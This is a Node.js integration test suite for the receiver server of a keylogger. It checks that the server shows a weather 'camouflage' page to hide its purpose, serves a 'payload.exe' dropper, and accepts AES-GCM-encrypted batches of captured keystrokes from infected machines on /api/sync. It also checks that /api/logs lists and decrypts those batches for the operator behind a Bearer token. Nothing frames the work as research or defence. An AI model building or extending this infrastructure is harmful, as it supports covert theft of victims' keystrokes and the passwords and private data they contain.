// Integration tests for the receiver API: boots `next dev` on a scratch
// port with test env (no BLOB_READ_WRITE_TOKEN -> in-memory fallback store,
// same code paths minus the Blob SDK) and exercises the real HTTP surface:
// weather page, health, /api/sync ingest + auth, /api/logs Bearer auth,
// on-demand decrypt.
//
// Run: node --test tests/receiver/api.test.mjs
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createCipheriv, randomBytes, createHash } from "node:crypto";
import { spawn, spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";
import path from "node:path";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const RECEIVER = path.join(__dirname, "..", "..", "receiver");
const PORT = 3999; // 3000 is commonly in use on this machine
const BASE = `http://localhost:${PORT}`;

const PSK = "deadbeef".repeat(8); // test PSK, 64 hex chars
const LOGS_TOKEN = "test-logs-token-0123456789";

const DEVID = createHash("sha256")
  .update("testmachine\\matt")
  .digest("hex")
  .slice(0, 16);

function seal(plaintext, devid = DEVID, psk = PSK) {
  const nonce = randomBytes(12);
  const cipher = createCipheriv("aes-256-gcm", Buffer.from(psk, "hex"), nonce);
  cipher.setAAD(Buffer.from(devid, "utf8"));
  const ct = Buffer.concat([cipher.update(plaintext, "utf8"), cipher.final()]);
  return {
    v: 1,
    d: devid,
    ts: Math.floor(Date.now() / 1000),
    n: nonce.toString("base64"),
    c: ct.toString("base64"),
    t: cipher.getAuthTag().toString("base64"),
  };
}

let server;

before(async () => {
  // process.env wins over .env.local in Next.js, so the blob token from
  // .env.local is neutralized to force the in-memory fallback store.
  // stdio is detached: on Windows the spawned shell's children keep the
  // pipes open, which would hang the test runner at exit.
  server = spawn("npx", ["next", "dev", "-p", String(PORT)], {
    cwd: RECEIVER,
    shell: true,
    stdio: "ignore",
    detached: false,
    env: {
      ...process.env,
      KEYLOGGER_PSK: PSK,
      LOGS_TOKEN,
      BLOB_READ_WRITE_TOKEN: "",
    },
  });

  // wait for readiness (up to 90 s — cold next dev is slow)
  const t0 = Date.now();
  for (;;) {
    try {
      const r = await fetch(`${BASE}/api/health`, {
        signal: AbortSignal.timeout(2000),
      });
      if (r.ok) break;
    } catch {
      /* not up yet */
    }
    if (Date.now() - t0 > 90_000) {
      killServer();
      throw new Error("next dev never became ready");
    }
    await new Promise((r) => setTimeout(r, 500));
  }
});

// server.kill() only kills the shell; taskkill /T takes the next dev child
// with it, otherwise the orphaned server holds the port and the run hangs.
function killServer() {
  if (!server || server.exitCode !== null) return;
  spawnSync("taskkill", ["/PID", String(server.pid), "/T", "/F"], {
    shell: true,
    stdio: "ignore",
  });
}

after(() => {
  killServer();
});

test("GET /api/health returns ok", async () => {
  const r = await fetch(`${BASE}/api/health`);
  assert.equal(r.status, 200);
  assert.equal((await r.json()).ok, true);
});

test("GET / serves the weather camouflage page", async () => {
  const r = await fetch(`${BASE}/`);
  assert.equal(r.status, 200);
  const html = await r.text();
  assert.match(html, /weather|forecast|temperature/i);
});

test("GET /payload.exe serves the dropper asset (404 acceptable if not built)", async () => {
  // build.py copies the exe here; absence is a 404, presence must download.
  const r = await fetch(`${BASE}/payload.exe`);
  assert.ok(r.status === 200 || r.status === 404, `got ${r.status}`);
});

test("POST /api/sync rejects bad json", async () => {
  const r = await fetch(`${BASE}/api/sync`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: "not json",
  });
  assert.equal(r.status, 400);
});

test("POST /api/sync rejects malformed fields", async () => {
  const r = await fetch(`${BASE}/api/sync`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ v: 1, d: DEVID }),
  });
  assert.equal(r.status, 400);
  assert.equal((await r.json()).error, "bad fields");
});

test("POST /api/sync rejects a batch from the wrong PSK (401)", async () => {
  const env = seal("hello", DEVID, "cafebabe".repeat(8));
  const r = await fetch(`${BASE}/api/sync`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(env),
  });
  assert.equal(r.status, 401);
  assert.equal((await r.json()).error, "auth");
});

test("POST /api/sync accepts a valid encrypted batch", async () => {
  const env = seal("integration test batch\nsecond line");
  const r = await fetch(`${BASE}/api/sync`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(env),
  });
  assert.equal(r.status, 200);
  assert.equal((await r.json()).ok, true);
});

test("GET /api/logs without a token is unauthorized", async () => {
  const r = await fetch(`${BASE}/api/logs`);
  assert.equal(r.status, 401);
});

test("GET /api/logs with a query-string token is unauthorized (headers only)", async () => {
  const r = await fetch(`${BASE}/api/logs?token=${encodeURIComponent(LOGS_TOKEN)}`);
  assert.equal(r.status, 401);
});

test("GET /api/logs with a wrong Bearer token is unauthorized", async () => {
  const r = await fetch(`${BASE}/api/logs`, {
    headers: { authorization: "Bearer wrong-token" },
  });
  assert.equal(r.status, 401);
});

test("GET /api/logs with the Bearer token lists the synced batch", async () => {
  const r = await fetch(`${BASE}/api/logs`, {
    headers: { authorization: `Bearer ${LOGS_TOKEN}` },
  });
  assert.equal(r.status, 200);
  const body = await r.json();
  assert.equal(body.ok, true);
  assert.ok(Array.isArray(body.batches));
  assert.ok(
    body.batches.some((b) => b.pathname.startsWith("batches/")),
    "synced batch not listed"
  );
});

test("GET /api/logs?full=1 decrypts on demand", async () => {
  const plaintext = "decrypt-on-demand probe\nwith second line";
  const env = seal(plaintext);
  const sync = await fetch(`${BASE}/api/sync`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(env),
  });
  assert.equal(sync.status, 200);

  const list = await fetch(`${BASE}/api/logs`, {
    headers: { authorization: `Bearer ${LOGS_TOKEN}` },
  }).then((r) => r.json());
  const mine = list.batches.find((b) => b.size === JSON.stringify(env).length);
  assert.ok(mine, "freshly synced batch not in listing");

  const full = await fetch(
    `${BASE}/api/logs?full=1&pathname=${encodeURIComponent(mine.pathname)}`,
    { headers: { authorization: `Bearer ${LOGS_TOKEN}` } }
  );
  assert.equal(full.status, 200);
  const body = await full.json();
  assert.equal(body.text, plaintext);
});

test("GET /api/logs?full=1 for a nonexistent batch is 404", async () => {
  const r = await fetch(
    `${BASE}/api/logs?full=1&pathname=${encodeURIComponent("batches/nope.txt")}`,
    { headers: { authorization: `Bearer ${LOGS_TOKEN}` } }
  );
  assert.equal(r.status, 404);
});
